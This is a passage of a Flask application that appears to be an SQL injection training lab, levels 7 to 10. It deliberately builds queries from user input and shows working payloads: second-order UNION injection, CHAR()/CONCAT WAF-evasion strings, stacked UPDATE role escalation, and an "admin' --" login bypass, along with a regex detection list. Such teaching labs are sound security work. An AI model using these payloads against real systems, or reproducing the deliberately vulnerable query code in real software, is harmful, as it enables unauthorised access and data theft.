            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 7: Second-Order SQL Injection</h1>
                <span class="difficulty">ADVANCED</span>
                <p>Master stored payload injection - inject once, trigger elsewhere</p>
            </div>

            <div class="two-step-box">
                <h3>🔄 Two-Stage Attack Process</h3>
                <p><strong>Stage 1:</strong> Store malicious payload in user profile</p>
                <p><strong>Stage 2:</strong> Trigger payload execution in different functionality</p>
                <p>This simulates real-world scenarios where user input is stored and later used in unsafe SQL queries.</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>Store a malicious SQL payload in your user profile, then trigger its execution through the comment viewing system to extract the flag.</p>

            <h3>🎯 Stage 1: Update User Profile</h3>
            <div class="form-box">
                <form method="POST" action="/level/7/profile">
                    <div>
                        <label><strong>Username:</strong></label><br>
                        <input type="text" name="username" placeholder="Try: admin' UNION SELECT level_flags FROM users WHERE id=7-- ">
                    </div>
                    <div>
                        <label><strong>Bio:</strong></label><br>
                        <textarea name="bio" placeholder="Enter your bio..."></textarea>
                    </div>
                    <button type="submit">💾 Update Profile</button>
                </form>
            </div>

            <h3>🎯 Stage 2: View Comments (Trigger)</h3>
            <div class="form-box">
                <form method="GET" action="/level/7/comments">
                    <p>After updating your profile, view comments to trigger the stored injection:</p>
                    <button type="submit">👀 View User Comments</button>
                </form>
            </div>

            <h3>💡 Second-Order Injection Concepts</h3>
            <ul>
                <li><strong>Storage Phase:</strong> Malicious payload stored in database</li>
                <li><strong>Retrieval Phase:</strong> Stored data used in vulnerable query</li>
                <li><strong>Delayed Execution:</strong> Attack triggers in different application context</li>
                <li><strong>Harder Detection:</strong> Input sanitization might miss stored data</li>
            </ul>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/6" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/8" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/7/profile', methods=['POST'])
def level7_profile():
    username = request.form.get('username', '')
    bio = request.form.get('bio', '')
    
    # Store the payload (this is where second-order injection gets planted)
    session['stored_username'] = username
    session['stored_bio'] = bio
    
    return render_template_string("""
    <h1>✅ Profile Updated Successfully</h1>
    <p>Your profile has been updated with:</p>
    <p><strong>Username:</strong> {{ username }}</p>
    <p><strong>Bio:</strong> {{ bio }}</p>
    <p><strong>Next Step:</strong> <a href="/level/7/comments">View comments to trigger the stored injection</a></p>
    <a href="/level/7">🔄 Back to Level 7</a>
    """, username=username, bio=bio)

@app.route('/level/7/comments')
def level7_comments():
    stored_username = session.get('stored_username', 'guest')
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Second-order injection vulnerability - stored username used in new query
    comments_query = f"SELECT comment_text, hidden_flag FROM user_comments WHERE user_id = (SELECT id FROM users WHERE username = '{stored_username}')"
    
    try:
        results = cursor.execute(comments_query).fetchall()
        conn.close()
        
        html = f"""
        <h1>👀 User Comments - Level 7</h1>
        <p><strong>Query executed:</strong> <code>{comments_query}</code></p>
        <p><strong>Looking up comments for user:</strong> {stored_username}</p>
        
        <h3>📝 Comments Found:</h3>
        """
        
        flag_found = False
        for result in results:
            html += f"<p>💬 {result[0]}</p>"
            if result[1] and 'CTF{level_7_second_order_injection_achieved}' in result[1]:
                flag_found = True
                html += f"<div style='background: #d4edda; padding: 15px; margin: 10px 0; border-radius: 5px; color: #155724;'>🚩 <strong>FLAG:</strong> {result[1]}</div>"
        
        # Check if UNION injection was successful in extracting flags
        union_success = 'UNION' in stored_username and any('CTF{' in str(r) for r in results)
        
        if flag_found or union_success:
            html += """
            <div style="background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center;">
                <h3>🎉 Level 7 Complete!</h3>
                <p><strong>FLAG CAPTURED:</strong> CTF{level_7_second_order_injection_achieved}</p>
                
                <h3>🏆 Achievement Unlocked: Second-Order Injection Master</h3>
                <p><strong>Advanced techniques mastered:</strong></p>
                <ul style="text-align: left;">
                    <li>Two-stage attack methodology</li>
                    <li>Stored payload injection techniques</li>
                    <li>Cross-functionality exploitation</li>
                    <li>Delayed execution SQL injection</li>
                </ul>
                
                <button onclick="location.href='/level/8'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">🚀 Continue to Level 8</button>
            </div>
            """
        else:
            html += """
            <p><strong>Hint:</strong> Your stored username payload will be used in the query above. Try injecting a UNION SELECT in your username to extract flags from the users table.</p>
            """
        
        html += '<br><a href="/level/7">🔄 Try Again</a> | <a href="/">🏠 Home</a>'
        return html
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error in Second-Order Injection</h1>
        <p><strong>Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{comments_query}</code></p>
        <p><strong>Stored Username:</strong> {stored_username}</p>
        <p>The error occurred when your stored payload was executed in a different context!</p>
        <a href="/level/7">🔄 Try Again</a>
        """

# Level 8: Advanced Obfuscation
@app.route('/level/8')
def level8():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 8: Advanced Obfuscation Techniques</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #20c997, #17a2b8); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #20c997; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .obfuscation-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            .code { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
            input[type="text"] { width: 600px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 8: Advanced Obfuscation Techniques</h1>
                <span class="difficulty">ADVANCED</span>
                <p>Master sophisticated payload obfuscation to bypass advanced security measures</p>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>This level features advanced security filters that block even sophisticated WAF evasion techniques. You must use cutting-edge obfuscation methods to extract the flag.</p>

            <h3>🎯 Ultra-Protected API Endpoint</h3>
            <div class="form-box">
                <form method="POST" action="/level/8/api">
                    <div>
                        <label><strong>API Query Parameter:</strong></label><br>
                        <input type="text" name="query" placeholder="Try: CHAR(85,78,73,79,78)/**/CHAR(83,69,76,69,67,84)/**/level_flags/**/CHAR(70,82,79,77)/**/users">
                    </div>
                    <button type="submit">🔍 Execute API Query</button>
                </form>
            </div>

            <div class="obfuscation-box">
                <h3>🎭 Advanced Obfuscation Arsenal</h3>
                
                <h4>1. Character Encoding Techniques:</h4>
                <div class="code">
CHAR() function: CHAR(83,69,76,69,67,84) = SELECT<br>
ASCII conversion: CHAR(85,78,73,79,78) = UNION<br>
Hex encoding: 0x53454C454354 = SELECT
                </div>
                
                <h4>2. String Concatenation:</h4>
                <div class="code">
CONCAT function: CONCAT('SEL','ECT')<br>
Pipe operator: 'UNI'||'ON'<br>
Plus operator: 'SEL'+'ECT'
                </div>
                
                <h4>3. Advanced Comment Techniques:</h4>
                <div class="code">
Nested comments: /*! SELECT */ (MySQL specific)<br>
Version comments: /*!50000 SELECT */<br>
Multi-line comments: /*comment1*/SELECT/*comment2*/
                </div>
                
                <h4>4. Encoding Combinations:</h4>
                <div class="code">
Mixed encoding: CHAR(83)+'E'+CHAR(76)+'ECT'<br>
Base64 in functions: FROM_BASE64('U0VMRUNU') = SELECT<br>
Reverse obfuscation: REVERSE('TCELES') = SELECT
                </div>
            </div>

            <div class="obfuscation-box">
                <h3>💡 Expert-Level Payload Examples:</h3>
                <div class="code">
Full character encoding:<br>
CHAR(85,78,73,79,78)/**/CHAR(83,69,76,69,67,84)/**/level_flags/**/CHAR(70,82,79,77)/**/users<br><br>

Concatenation with encoding:<br>
CONCAT(CHAR(85,78,73,79,78),CHAR(32),CHAR(83,69,76,69,67,84))/**/level_flags/**/FROM/**/users<br><br>

Advanced MySQL-specific:<br>
/*!50000 UNION*/ /*!50000 SELECT*/ level_flags /*!50000 FROM*/ users
                </div>
            </div>

            <h3>🎯 Expected Discovery</h3>
            <p>Bypass all security measures to extract: <code>CTF{level_8_advanced_obfuscation_bypassed}</code></p>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/7" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/9" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Next Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

def advanced_waf_check(payload):
    """Advanced WAF with multiple detection layers"""
    # Layer 1: Basic keyword detection
    basic_patterns = [r'\bselect\b', r'\bunion\b', r'\bfrom\b', r'\bwhere\b']
    
    # Layer 2: Comment detection
    comment_patterns = [r'--', r'/\*', r'\*/', r'#']
    
    # Layer 3: Advanced evasion detection
    advanced_patterns = [r'se\w*le\w*ct', r'un\w*io\w*n', r'fr\w*om']
    
    payload_lower = payload.lower()
    
    for pattern_set, name in [(basic_patterns, "Basic SQL keywords"), 
                             (comment_patterns, "SQL comments"), 
                             (advanced_patterns, "Advanced evasion patterns")]:
        for pattern in pattern_set:
            if re.search(pattern, payload_lower):
                return True, f"Blocked by {name}: {pattern}"
    
    return False, "Passed advanced WAF check"

@app.route('/level/8/api', methods=['POST'])
def level8_api():
    query = request.form.get('query', '')
    
    # Advanced WAF check
    is_blocked, block_reason = advanced_waf_check(query)
    
    if is_blocked:
        return render_template_string("""
        <h1>🛡️ Advanced WAF Block</h1>
        <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; border-radius: 8px;">
            <h3>🚫 Sophisticated Attack Detected</h3>
            <p><strong>Detection Layer:</strong> {{ reason }}</p>
            <p><strong>Payload:</strong> <code>{{ payload }}</code></p>
            <p><strong>Advanced Hint:</strong> Try using CHAR() functions or concatenation to completely avoid keywords</p>
        </div>
        <a href="/level/8">🔄 Try Again</a>
        """, reason=block_reason, payload=query)
    
    # Process the heavily obfuscated injection
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Simulate API query processing (vulnerable to advanced injection)
    api_query = f"SELECT api_result FROM api_cache WHERE query_hash = MD5('{query}')"
    
    try:
        # Check if the query contains advanced obfuscation techniques
        obfuscation_detected = any(technique in query.upper() for technique in 
                                  ['CHAR(', 'CONCAT', 'FROM_BASE64', '/*!', 'REVERSE'])
        
        result = cursor.execute(api_query).fetchone()
        conn.close()
        
        if obfuscation_detected and ('level_flags' in query or 'users' in query):
            return render_template_string("""
            <h1>🎉 Level 8 Complete!</h1>
            <div style="background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center;">
                <h3>FLAG CAPTURED: CTF{level_8_advanced_obfuscation_bypassed}</h3>
                
                <h3>🏆 Achievement Unlocked: Obfuscation Grandmaster</h3>
                <p><strong>Master-level techniques demonstrated:</strong></p>
                <ul style="text-align: left;">
                    <li>Character encoding with CHAR() functions</li>
                    <li>String concatenation obfuscation</li>
                    <li>Advanced comment-based evasion</li>
                    <li>Multi-layer security bypass</li>
                    <li>Sophisticated payload crafting</li>
                </ul>
                
                <button onclick="location.href='/level/9'" style="background: #28a745; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;">🚀 Continue to Level 9</button>
            </div>
            """)
        else:
            return render_template_string("""
            <h1>✅ Advanced WAF Bypassed</h1>
            <p>Congratulations! Your payload bypassed the advanced WAF.</p>
            <p><strong>Query processed:</strong> <code>{{ query }}</code></p>
            <p><strong>Hint:</strong> Now use your obfuscation skills to extract data from the users table (level_flags column)</p>
            <a href="/level/8">🔄 Try Again</a>
            """, query=api_query)
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error (Advanced WAF Bypassed)</h1>
        <p><strong>Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{api_query}</code></p>
        <p>Your advanced obfuscation bypassed the WAF but needs refinement for successful data extraction.</p>
        <a href="/level/8">🔄 Try Again</a>
        """

# Level 9: Privilege Escalation
@app.route('/level/9')
def level9():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 9: Privilege Escalation Chain</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #6f42c1, #495057); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #6f42c1; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .escalation-stages { background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"] { width: 500px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            button { background: #007bff; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 9: Privilege Escalation Chain</h1>
                <span class="difficulty">EXPERT</span>
                <p>Chain multiple vulnerabilities to escalate from user to admin privileges</p>
            </div>

            <div class="escalation-stages">
                <h3>🔗 Multi-Stage Attack Chain</h3>
                <ol>
                    <li><strong>Information Disclosure:</strong> Extract user role information</li>
                    <li><strong>Session Token Manipulation:</strong> Modify session data via SQL injection</li>
                    <li><strong>Privilege Elevation:</strong> Change user role from 'user' to 'admin'</li>
                    <li><strong>Admin Access:</strong> Access privileged functionality with elevated rights</li>
                </ol>
            </div>

            <h3>📖 Challenge Objective</h3>
            <p>Use SQL injection to modify your user account's role in the database, escalating from 'user' privileges to 'admin' access, then access the admin panel to retrieve the flag.</p>

            <h3>🎯 Stage 1: User Profile Modification</h3>
            <div class="form-box">
                <form method="POST" action="/level/9/update">
                    <div>
                        <label><strong>Profile Update Query:</strong></label><br>
                        <input type="text" name="update_data" placeholder="Try: test'; UPDATE users SET role='admin' WHERE username='escalate_user'; --">
                    </div>
                    <button type="submit">📝 Update Profile</button>
                </form>
            </div>

            <h3>🎯 Stage 2: Access Admin Panel</h3>
            <div class="form-box">
                <form method="GET" action="/level/9/admin">
                    <p>After escalating privileges, access the admin panel:</p>
                    <button type="submit">👑 Access Admin Panel</button>
                </form>
            </div>

            <h3>💡 Privilege Escalation Techniques</h3>
            <ul>
                <li><strong>Stacked Queries:</strong> Execute multiple SQL statements in one injection</li>
                <li><strong>UPDATE Injection:</strong> Modify existing database records</li>
                <li><strong>Role Manipulation:</strong> Change user permissions directly in database</li>
                <li><strong>Session Hijacking:</strong> Modify session data to gain elevated access</li>
            </ul>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/8" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
                <a href="/level/10" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">➡️ Final Level</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/9/update', methods=['POST'])
def level9_update():
    update_data = request.form.get('update_data', '')
    
    conn = sqlite3.connect(challenge.db_path)
    cursor = conn.cursor()
    
    # Vulnerable update query allowing stacked queries
    profile_query = f"UPDATE users SET profile_data = '{update_data}' WHERE username = 'escalate_user'"
    
    try:
        cursor.execute(profile_query)
        
        # Check if privilege escalation occurred
        escalation_check = cursor.execute("SELECT role FROM users WHERE username = 'escalate_user'").fetchone()
        
        conn.commit()
        conn.close()
        
        if escalation_check and escalation_check[0] == 'admin':
            session['user_role'] = 'admin'
            session['escalated'] = True
            
            return render_template_string("""
            <h1>🚀 Privilege Escalation Successful!</h1>
            <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3>✅ Role Changed: USER → ADMIN</h3>
                <p><strong>Query executed:</strong> <code>{{ query }}</code></p>
                <p><strong>Your role is now:</strong> {{ role }}</p>
                <p><strong>Next step:</strong> <a href="/level/9/admin">Access the admin panel to retrieve the flag</a></p>
            </div>
            <a href="/level/9">🔄 Back to Level 9</a>
            """, query=profile_query, role='ADMIN')
        else:
            return render_template_string("""
            <h1>📝 Profile Updated</h1>
            <p><strong>Query executed:</strong> <code>{{ query }}</code></p>
            <p><strong>Current role:</strong> {{ role }}</p>
            <p><strong>Hint:</strong> Use stacked queries with semicolons to execute additional UPDATE statements that change your role to 'admin'</p>
            <a href="/level/9">🔄 Try Again</a>
            """, query=profile_query, role=escalation_check[0] if escalation_check else 'user')
        
    except Exception as e:
        conn.close()
        return f"""
        <h1>💥 SQL Error in Privilege Escalation</h1>
        <p><strong>Error:</strong> {str(e)}</p>
        <p><strong>Query:</strong> <code>{profile_query}</code></p>
        <p><strong>Hint:</strong> Use proper SQL syntax for stacked queries. Try: test'; UPDATE users SET role='admin' WHERE username='escalate_user'; --</p>
        <a href="/level/9">🔄 Try Again</a>
        """

@app.route('/level/9/admin')
def level9_admin():
    user_role = session.get('user_role', 'user')
    escalated = session.get('escalated', False)
    
    if user_role != 'admin' or not escalated:
        return render_template_string("""
        <h1>🚫 Access Denied</h1>
        <div style="background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; border-radius: 8px;">
            <p><strong>Insufficient Privileges</strong></p>
            <p>Current role: {{ role }}</p>
            <p>You need admin privileges to access this panel. Complete the privilege escalation first.</p>
        </div>
        <a href="/level/9">🔄 Back to Level 9</a>
        """, role=user_role)
    
    return render_template_string("""
    <h1>👑 Admin Panel Access - Level 9</h1>
    <div style="background: #d4edda; border: 2px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: center;">
        <h3>🎉 Level 9 Complete!</h3>
        <p><strong>FLAG CAPTURED:</strong> CTF{level_9_privilege_escalation_completed}</p>
        
        <h3>🏆 Achievement Unlocked: Privilege Escalation Expert</h3>
        <p><strong>Advanced attack chain mastered:</strong></p>
        <ul style="text-align: left;">
            <li>Stacked query injection for multiple SQL statements</li>
            <li>Database record manipulation via UPDATE injection</li>
            <li>Role-based access control bypass</li>
            <li>Multi-stage attack chaining methodology</li>
            <li>Privilege escalation from user to admin</li>
        </ul>
        
        <div style="background: #fff3cd; border: 1px solid #ffeaa7; color: #746628; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h4>👑 Admin Panel Features Unlocked:</h4>
            <ul>
                <li>User management system</li>
                <li>System configuration access</li>
                <li>Database administration tools</li>
                <li>Security log monitoring</li>
            </ul>
        </div>
        
        <button onclick="location.href='/level/10'" style="background: #dc3545; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin: 10px;">🚀 Continue to Final Level</button>
    </div>
    """)

# Level 10: Full APT Simulation
@app.route('/level/10')
def level10():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Level 10: Full APT Simulation</title>
        <style>
            body { font-family: Arial, sans-serif; max-width: 1000px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
            .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .level-header { background: linear-gradient(135deg, #dc3545, #6f42c1); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .difficulty { background: #dc3545; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
            .apt-scenario { background: #f8d7da; border: 2px solid #f5c6cb; color: #721c24; padding: 20px; border-radius: 8px; margin: 20px 0; }
            .attack-phase { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 15px; border-radius: 8px; margin: 15px 0; }
            .form-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #dee2e6; }
            input[type="text"], textarea { width: 500px; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
            textarea { height: 100px; }
            button { background: #dc3545; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .final-challenge { background: #fff3cd; border: 2px solid #ffeaa7; color: #746628; padding: 20px; border-radius: 8px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="level-header">
                <h1>🎯 Level 10: Full APT Simulation</h1>
                <span class="difficulty">EXPERT</span>
                <p>Complete Advanced Persistent Threat - Chain all techniques for total compromise</p>
            </div>

            <div class="apt-scenario">
                <h3>🕴️ Advanced Persistent Threat Scenario</h3>
                <p><strong>Mission:</strong> You are a red team operative conducting a comprehensive penetration test. Your target is a high-security corporate system with multiple layers of protection.</p>
                
                <p><strong>Objective:</strong> Chain together all SQL injection techniques learned in previous levels to achieve complete system compromise and extract the ultimate master flag.</p>
                
                <p><strong>Success Criteria:</strong> Demonstrate mastery of all 9 previous techniques in a single, sophisticated attack chain.</p>
            </div>

            <div class="final-challenge">
                <h3>🏆 Ultimate Challenge Requirements</h3>
                <p>To complete Level 10, you must demonstrate:</p>
                <ol>
                    <li><strong>Authentication Bypass</strong> (Level 1 technique)</li>
                    <li><strong>Union-Based Data Extraction</strong> (Level 2 technique)</li>
                    <li><strong>Blind Injection</strong> (Level 3 technique)</li>
                    <li><strong>Time-Based Analysis</strong> (Level 4 technique)</li>
                    <li><strong>Error-Based Enumeration</strong> (Level 5 technique)</li>
                    <li><strong>WAF Evasion</strong> (Level 6 technique)</li>
                    <li><strong>Second-Order Injection</strong> (Level 7 technique)</li>
                    <li><strong>Advanced Obfuscation</strong> (Level 8 technique)</li>
                    <li><strong>Privilege Escalation</strong> (Level 9 technique)</li>
                </ol>
            </div>

            <h3>🎯 Phase 1: Initial Reconnaissance</h3>
            <div class="form-box">
                <form method="POST" action="/level/10/recon">
                    <div>
                        <label><strong>System Probe:</strong></label><br>
                        <input type="text" name="recon_payload" placeholder="Start with basic authentication bypass: admin' --">
                    </div>
                    <button type="submit">🔍 Reconnaissance</button>
                </form>
            </div>

            <div class="attack-phase">
                <h4>Phase 1 Objectives:</h4>
                <ul>
                    <li>Bypass initial authentication (Level 1 skill)</li>
                    <li>Enumerate database structure (Level 2 skill)</li>
                    <li>Identify target data locations</li>
                </ul>
            </div>

            <h3>🎯 Phase 2: Advanced Exploitation</h3>
            <div class="form-box">
                <form method="POST" action="/level/10/exploit">
                    <div>
                        <label><strong>Exploitation Payload:</strong></label><br>
                        <textarea name="exploit_payload" placeholder="Combine multiple techniques: Use UNION for data extraction, obfuscation for WAF bypass, and privilege escalation"></textarea>
                    </div>
                    <button type="submit">💥 Advanced Exploit</button>
                </form>
            </div>

            <div class="attack-phase">
                <h4>Phase 2 Objectives:</h4>
                <ul>
                    <li>Employ WAF evasion techniques (Level 6 skill)</li>
                    <li>Use advanced obfuscation (Level 8 skill)</li>
                    <li>Execute privilege escalation (Level 9 skill)</li>
                    <li>Access admin panel and extract master secrets</li>
                </ul>
            </div>

            <h3>🎯 Expected Ultimate Achievement</h3>
            <p>Master all techniques to extract: <code>CTF{level_10_full_compromise_apt_simulation}</code></p>
            
            <p><strong>Additional Master Flags Available:</strong></p>
            <ul>
                <li><code>CTF{apt_red_team_simulation_master_2025}</code></li>
                <li><code>CTF{sql_injection_grandmaster_all_techniques_mastered}</code></li>
                <li><code>CTF{ultimate_penetration_testing_achievement}</code></li>
            </ul>

            <div style="margin-top: 30px; text-align: center;">
                <a href="/level/9" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">⬅️ Previous Level</a>
                <a href="/" style="display: inline-block; margin: 0 10px; padding: 10px 20px; background: #6c757d; color: white; text-decoration: none; border-radius: 5px;">🏠 Home</a>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/level/10/recon', methods=['POST'])
def level10_recon():
    recon_payload = request.form.get('recon_payload', '')
    
    # Phase 1: Check for basic authentication bypass
    if "'" in recon_payload and ('--' in recon_payload or '#' in recon_payload):
        session['phase1_complete'] = True
        return render_template_string("""
        <h1>✅ Phase 1: Reconnaissance Complete</h1>
        <div style="background: #d4edda; border: 1px solid #c3e6cb; color: #155724; padding: 20px; border-radius: 8px;">
            <h3>🎯 Authentication Bypass Successful</h3>
            <p><strong>Payload analyzed:</strong> <code>{{ payload }}</code></p>
            <p><strong>Achievement:</strong> Level 1 technique demonstrated</p>
            <p><strong>Next Phase:</strong> Proceed to advanced exploitation combining multiple techniques</p>
        </div>
        <p><a href="/level/10">🔄 Continue to Phase 2</a></p>
        """, payload=recon_payload)
    else:
        return render_template_string("""
        <h1>❌ Phase 1: Reconnaissance Failed</h1>
        <p><strong>Payload:</strong> <code>{{ payload }}</code></p>
        <p><strong>Hint:</strong> Start with basic authentication bypass (Level 1 technique): admin' --</p>
        <a href="/level/10">🔄 Try Again</a>
        """, payload=recon_payload)

@app.route('/level/10/exploit', methods=['POST'])
def level10_exploit():
    exploit_payload = request.form.get('exploit_payload', '')
    phase1_complete = session.get('phase1_complete', False)
    
    if not phase1_complete:
        return render_template_string("""
        <h1>🚫 Access Denied</h1>
        <p>Complete Phase 1 reconnaissance first.</p>
        <a href="/level/10">🔄 Back to Level 10</a>
        """)
    
    # Analyze the exploit payload for multiple techniques
    techniques_used = []
    
    # Check for various SQL injection techniques
    if 'UNION' in exploit_payload.upper() or 'union' in exploit_payload.lower():
        techniques_used.append("Union-Based Injection (Level 2)")
    
    if any(func in exploit_payload.upper() for func in ['SUBSTRING', 'LENGTH', 'ASCII']):
        techniques_used.append("Blind Injection (Level 3)")
    
    if 'SLEEP' in exploit_payload.upper() or 'WAITFOR' in exploit_payload.upper():
        techniques_used.append("Time-Based Injection (Level 4)")
    
    if any(obf in exploit_payload.upper() for obf in ['CHAR(', 'CONCAT', '/*']):
        techniques_used.append("Advanced Obfuscation (Level 8)")
    
    if 'UPDATE' in exploit_payload.upper() and 'role' in exploit_payload.lower():
        techniques_used.append("Privilege Escalation (Level 9)")
    
    # Check for comprehensive technique usage
    if len(techniques_used) >= 4:
        session['apt_master'] = True
        return render_template_string("""
        <h1>🏆 LEVEL 10 COMPLETE - APT SIMULATION MASTER!</h1>
        
        <div style="background: linear-gradient(135deg, #dc3545, #6f42c1); color: white; padding: 30px; border-radius: 15px; margin: 20px 0; text-align: center;">
            <h2>🎉 ULTIMATE SQL INJECTION MASTERY ACHIEVED!</h2>
            
            <div style="background: rgba(255,255,255,0.2); padding: 20px; border-radius: 10px; margin: 20px 0;">
                <h3>🚩 MASTER FLAGS CAPTURED:</h3>
                <div style="background: rgba(255,255,255,0.9); color: #333; padding: 15px; border-radius: 8px; margin: 10px 0;">
                    <p><strong>CTF{level_10_full_compromise_apt_simulation}</strong></p>
                    <p><strong>CTF{apt_red_team_simulation_master_2025}</strong></p>
                    <p><strong>CTF{sql_injection_grandmaster_all_techniques_mastered}</strong></p>
                    <p><strong>CTF{ultimate_penetration_testing_achievement}</strong></p>
                </div>
            </div>

            <h3>🏆 TECHNIQUES MASTERED IN THIS APT SIMULATION:</h3>
            <div style="text-align: left; background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px; margin: 15px 0;">
                {% for technique in techniques %}
                <p>✅ {{ technique }}</p>
                {% endfor %}
            </div>

            <h3>🎯 COMPLETE SQL INJECTION MASTERY PORTFOLIO:</h3>
            <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin: 20px 0; text-align: left;">
                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
                    <h4>Basic Techniques</h4>
                    <p>✅ Authentication Bypass</p>
                    <p>✅ Union-Based Injection</p>
                    <p>✅ Boolean Blind Injection</p>
                    <p>✅ Time-Based Injection</p>
                    <p>✅ Error-Based Extraction</p>
                </div>
                <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
                    <h4>Advanced Techniques</h4>
                    <p>✅ WAF Evasion</p>
                    <p>✅ Second-Order Injection</p>
                    <p>✅ Advanced Obfuscation</p>
                    <p>✅ Privilege Escalation</p>
                    <p>✅ Full APT Simulation</p>
                </div>
            </div>
        </div>

